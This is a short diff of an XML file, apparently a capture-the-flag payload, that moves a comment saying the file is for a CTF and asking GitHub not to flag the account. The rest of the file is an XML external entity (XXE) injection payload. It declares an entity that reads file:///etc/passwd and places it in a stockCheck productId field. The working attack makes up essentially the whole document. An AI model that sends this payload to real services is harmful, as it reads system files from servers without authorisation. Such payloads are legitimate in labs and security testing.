@@ -1,5 +1,4 @@
-<!--it's for ctf github don't strike my account-->
-
 <?xml version="1.0" encoding="UTF-8"?>
+<!--it's for ctf github don't strike my account-->
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <stockCheck><productId>&xxe;</productId></stockCheck>
